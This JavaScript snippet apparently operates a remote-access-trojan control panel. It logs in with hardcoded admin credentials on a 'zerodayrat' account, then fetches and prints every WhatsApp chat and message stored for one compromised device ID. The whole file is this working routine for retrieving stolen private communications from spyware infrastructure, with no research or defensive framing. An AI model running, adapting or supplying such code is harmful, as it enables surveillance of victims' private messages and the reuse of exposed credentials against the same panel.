async function checkDeviceWhatsApp() {
  const loginRes = await fetch('https://api2.nikaipro.com/api/auth/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email: 'admin@zerodayrat.com', password: 'admin@zerodayRAT' })
  });
  const { token } = await loginRes.json();
  const deviceId = "0090c79b-b5e0-48b7-932b-65df369c0f4c";

  const dbCheckRes = await fetch(`https://api2.nikaipro.com/api/devices/${deviceId}/whatsapp/db-check`, {
    headers: { Authorization: `Bearer ${token}` }
  });
  const data = await dbCheckRes.json();
  console.log("Total messages:", data.messages_count);
  console.log("Total chats:", data.chats_count);
  console.log("Chats:", JSON.stringify(data.chats, null, 2));
  console.log("All messages:", JSON.stringify(data.messages, null, 2));
}
checkDeviceWhatsApp().catch(console.error);
